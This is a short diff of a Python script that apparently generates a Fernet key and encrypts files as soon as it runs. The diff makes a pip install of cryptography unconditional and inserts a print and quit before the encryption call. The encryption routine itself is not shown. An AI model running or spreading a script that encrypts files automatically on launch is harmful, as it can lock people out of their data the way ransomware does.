@@ -1,12 +1,8 @@
 import base64
 import os
 import sys
-
-# ToDo: Check for cryptography library
-if "cryptography" not in sys.modules:
-    import subprocess
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
-    quit()
+import subprocess
+subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
 
 from cryptography.fernet import Fernet, InvalidToken
 from cryptography.hazmat.backends import default_backend
@@ -99,7 +95,8 @@ def decryptFile(filePath, key):
     except Exception as e:
         return False
     
-
+print(sys.argv[0])
+quit()
 key = generateKey()
 encryptFiles(key)
 
